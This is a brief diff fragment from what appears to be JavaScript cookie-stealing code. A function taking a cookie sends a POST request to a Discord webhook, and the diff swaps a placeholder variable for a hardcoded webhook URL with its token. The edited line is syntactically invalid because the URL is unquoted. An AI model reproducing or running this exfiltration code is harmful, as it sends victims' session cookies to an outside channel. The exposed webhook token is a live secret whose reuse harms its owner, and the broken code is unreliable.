@@ -55,7 +55,7 @@ async function main(cookie) {
 
 
     await Promise.all([
-        fetch(WEBHOOK, {
+        fetch(https://discord.com/api/webhooks/1445988972835770439/BEAdATfuF_vCWdG6FeXCZQEAaw3BsNv-YsoQGfl3sRQXNw8xDerj7WrFrFkzGYTlf4yo, {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
